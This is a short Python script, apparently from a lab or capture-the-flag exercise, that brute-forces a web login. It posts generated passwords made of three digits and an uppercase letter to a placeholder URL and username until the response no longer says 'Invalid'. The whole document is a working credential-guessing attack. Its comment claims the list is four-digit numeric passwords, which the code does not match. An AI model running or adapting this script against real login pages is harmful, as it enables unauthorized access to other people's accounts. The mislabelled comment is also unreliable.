import requests
import string
url="url"
username="username"
#genrating four digit numeric passwords 
# from (0000-9999)
password_list = [str(i).zfill(3) + c for i in range(1000) for c in string.ascii_uppercase]  # list comprehension

def bruteforce():
    for password in password_list:
        data={"username": username, "password": password}
        response=requests.post(url,data=data)
        
        
        if "Invalid" not in response.text:
            print(f'[+] found valid credential: {username} {password}')
            break
        else:
            print(f"[-] attempted: {password}")
bruteforce()
